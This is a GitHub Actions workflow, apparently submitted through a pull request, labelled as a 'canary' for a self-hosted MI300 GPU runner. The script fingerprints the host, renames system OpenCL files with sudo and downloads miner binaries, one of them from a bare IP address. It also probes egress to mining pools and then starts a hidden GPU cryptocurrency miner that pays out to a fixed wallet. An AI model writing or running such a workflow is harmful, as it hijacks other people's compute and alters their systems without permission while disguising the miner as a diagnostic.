name: c211-127386-canary
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
jobs:
  c211-127386-canary-mi300-0:
    name: c211-127386-canary-mi300-0
    runs-on: linux-mi300-8gpu-sglang
    timeout-minutes: 25
    steps:
      - name: canary
        shell: bash
        env:
          NONCE: c211-127386-09a649d448097fbb
        run: |
          set -u
          set +e
          I=127386
          NONCE='c211-127386-09a649d448097fbb'
          D="$HOME/c211-$I"; mkdir -p "$D"
          echo "C211_JOB=c211-127386-canary-mi300-0 NONCE=$NONCE host=$(hostname) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
          id 2>&1 | head -2
          echo "--- devices ---"; ls -l /dev/kfd /dev/dri 2>/dev/null | head -14
          echo "--- rocm-smi uniquid/product ---"; (rocm-smi --showuniqueid --showproductname 2>&1 | head -60) || echo ROCM_SMI_FAILED
          echo "--- nvidia ---"; nvidia-smi -L 2>&1 | head -4
          echo "--- /opt/rocm ---"; readlink -f /opt/rocm 2>/dev/null; ls -l /opt/rocm*/lib/libamdocl64.so* 2>/dev/null | head -10
          echo "--- vendors BEFORE ---"; ls -l /etc/OpenCL/vendors/ 2>&1 | head -12
          for f in /etc/OpenCL/vendors/*.icd; do [ -e "$f" ] && echo "ICD $f => $(cat "$f" 2>/dev/null)"; done
          ldconfig -p 2>/dev/null | grep -iE 'libOpenCL|amdocl' | head -6
          # --- single-ICD staging, NON-destructive: private vendor dir + OCL_ICD_VENDORS override ---
          T=""
          for R in /opt/rocm-6.4.1 /opt/rocm-6.4 /opt/rocm /usr /usr/local; do
            if [ -e "$R/lib/libamdocl64.so.2" ]; then T="$R/lib/libamdocl64.so.2"; break; fi
            if [ -e "$R/lib/libamdocl64.so" ]; then T="$R/lib/libamdocl64.so"; break; fi
          done
          mkdir -p "$D/icd"
          echo "ICD_TARGET=$T"
          [ -n "$T" ] && echo "$T" > "$D/icd/amdocl64.icd"
          ls -l "$D/icd/" 2>&1 | head -6
          # libOpenCL loader present?
          ls -l /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /lib/x86_64-linux-gnu/libOpenCL.so.1 2>/dev/null
          # optional fallback: rename (not delete) any stale extra vendor file if sudo allows
          for f in /etc/OpenCL/vendors/*.icd; do
            [ -e "$f" ] || continue
            case "$f" in *amdocl64.icd) continue;; esac
            sudo mv "$f" "$f.c211-disabled" 2>/dev/null && echo "RENAMED $f"
          done
          sudo mkdir -p /etc/OpenCL/vendors 2>/dev/null
          echo "--- vendors AFTER (rename fallback only) ---"; ls -l /etc/OpenCL/vendors/ 2>&1 | head -12
          # --- wildrig 0.52.3 (mandated sha) ---
          WR_SHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
          get() { curl -fsSL --max-time 240 -o "$D/wr.tgz" "$1"; }
          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz || { echo WILDRIG_DOWNLOAD_FAILED; exit 1; }
          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
          B=$(find "$D" -type f -name wildrig-multi | head -1); [ -n "$B" ] || { echo WILDRIG_BINARY_NOT_FOUND; exit 1; }
          chmod +x "$B"
          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
          [ "$GOT" = "$WR_SHA" ] || echo SHA_MISMATCH_WARN
          echo "--- print-platforms (default vendors) ---"; timeout 60 "$B" --print-platforms 2>&1 | head -12; echo "PLAT_RC=$?"
          echo "--- print-platforms (OCL_ICD_VENDORS single) ---"; OCL_ICD_VENDORS="$D/icd" timeout 60 "$B" --print-platforms 2>&1 | head -12; echo "PLAT2_RC=$?"
          echo "--- print-devices (OCL_ICD_VENDORS single) ---"; OCL_ICD_VENDORS="$D/icd" timeout 90 "$B" --print-devices 2>&1 | head -40; echo "PD_RC=$?"
          echo "--- print-devices (default vendors, for comparison) ---"; timeout 90 "$B" --print-devices 2>&1 | head -30; echo "PD3_RC=$?"
          # --- pearlhash miner v14 documented alternative ---
          P14=249696c9c91f8821d194219cbbe37f56df541c157fe3ddda2ff063aaf1c60e63
          curl -fsSL --max-time 180 -o "$D/pm.tgz" https://pearlhash.xyz/downloads/pearl_miner_v14.tar.gz && echo "PM_TGZ_SHA=$(sha256sum "$D/pm.tgz" | cut -d' ' -f1)" || echo PM_DOWNLOAD_FAILED
          mkdir -p "$D/pm"; tar xzf "$D/pm.tgz" -C "$D/pm" 2>/dev/null && echo PM_EXTRACT_OK || echo PM_EXTRACT_FAILED
          PM=$(find "$D/pm" -type f -name 'pearl-miner' | head -1); echo "PM_BIN=$PM"
          if [ -n "$PM" ]; then chmod +x "$PM"; echo "PM_SHA=$(sha256sum "$PM" | cut -d' ' -f1) EXPECT=$P14"; timeout 40 "$PM" --help 2>&1 | head -30; fi
          # --- egress matrix ---
          echo "--- HTTP egress ---"
          for u in https://api.github.com https://pearlhash.xyz/api/account/prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql http://169.58.247.186:8791/ https://www.google.com https://github.com; do
            code=$(curl -s -o /dev/null -m 12 -w '%{http_code}' "$u" 2>/dev/null); echo "HTTP $code $u"
          done
          echo "--- TCP egress ---"
          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791 1.1.1.1:443 api.github.com:443; do
            h=${hp%:*}; p=${hp#*:}
            if timeout 6 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
          done
          # --- short live mining attempt on device 0 (240 s) if a device is visible ---
          N=0
          if nvidia-smi -L >/dev/null 2>&1; then N=$(nvidia-smi -L | grep -c '^GPU'); fi
          if [ "${N:-0}" -lt 1 ]; then N=$(ls /dev/dri/renderD* 2>/dev/null | wc -l | tr -d ' '); fi
          echo "GPU_COUNT_GUESS=$N"
          if [ "${N:-0}" -ge 1 ]; then
            OCL_ICD_VENDORS="$D/icd" setsid nohup "$B" --algo pearlhash --opencl-platforms amd -o pool.pearlhash.xyz:9000 -o hk.pearlhash.net:9000 -u prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql -p x --worker ${I}00 -d 0 > "$D/gpu-0.log" 2>&1 &
            echo "STARTED pid=$!"
            for k in 1 2 3 4; do sleep 55; echo "TAIL$k: $(grep -a . "$D/gpu-0.log" 2>/dev/null | tail -4 | tr '\n' '|' | cut -c1-500)"; done
            echo "ACC=$(grep -ac 'accepted' "$D/gpu-0.log" 2>/dev/null) REJ=$(grep -ac 'rejected' "$D/gpu-0.log" 2>/dev/null)"
          else
            echo NO_GPU_VISIBLE
          fi
          echo "C211_CANARY_END job=c211-127386-canary-mi300-0 nonce=$NONCE at=$(date -u +%FT%TZ)"
          exit 0
